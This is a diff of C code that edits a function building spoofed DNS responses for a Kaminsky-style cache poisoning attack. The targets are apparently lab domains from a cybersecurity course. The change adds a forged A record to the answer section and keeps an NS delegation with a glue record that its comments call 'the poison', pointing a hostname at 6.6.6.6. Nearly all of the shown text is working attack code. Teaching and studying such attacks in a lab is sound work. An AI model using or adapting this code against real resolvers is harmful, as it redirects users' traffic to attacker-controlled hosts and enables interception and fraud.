@@ -530,11 +530,18 @@ static int build_spoofed_response(const char *qname,
     ldns_pkt_push_rr(response, LDNS_SECTION_QUESTION, question);
     ldns_pkt_set_qdcount(response, 1);
 
-    // Answer section: EMPTY (this is a referral response, not a direct answer)
-    // The resolver will cache the authority/additional sections
+    // Answer section: Directly answer the query with poisoned IP
+    // This caches the A record for the queried subdomain (e.g., ww0.example1...)
+    ldns_rr *answer_rr = ldns_rr_new();
+    ldns_rr_set_owner(answer_rr, ldns_dname_new_frm_str(qname));
+    ldns_rr_set_type(answer_rr, LDNS_RR_TYPE_A);
+    ldns_rr_set_class(answer_rr, LDNS_RR_CLASS_IN);
+    ldns_rr_set_ttl(answer_rr, 86400);
+    ldns_rr_push_rdf(answer_rr, ldns_rdf_new_frm_str(LDNS_RDF_TYPE_A, "1.2.3.4"));
+    ldns_pkt_push_rr(response, LDNS_SECTION_ANSWER, answer_rr);
 
-    // Authority section: NS record claiming www.example1.cybercourse.example.com is the NS
-    // This is the Kaminsky trick - make the TARGET domain appear as the nameserver
+    // Authority section: Claim example1.cybercourse.example.com delegates to www.example1...
+    // This matches the course example pattern (zone NS target)
     authority_rr = ldns_rr_new();
     ldns_rr_set_owner(authority_rr, ldns_dname_new_frm_str("example1.cybercourse.example.com"));
     ldns_rr_set_type(authority_rr, LDNS_RR_TYPE_NS);
@@ -543,8 +550,8 @@ static int build_spoofed_response(const char *qname,
     ldns_rr_push_rdf(authority_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_pkt_push_rr(response, LDNS_SECTION_AUTHORITY, authority_rr);
 
-    // Additional section: A record for www.example1.cybercourse.example.com (glue)
-    // This is the poison! When cached, www.example1... will resolve to 6.6.6.6
+    // Additional section: Glue record for the NS (THE POISON!)
+    // This makes www.example1.cybercourse.example.com resolve to 6.6.6.6
     additional_rr = ldns_rr_new();
     ldns_rr_set_owner(additional_rr, ldns_dname_new_frm_str("www.example1.cybercourse.example.com"));
     ldns_rr_set_type(additional_rr, LDNS_RR_TYPE_A);
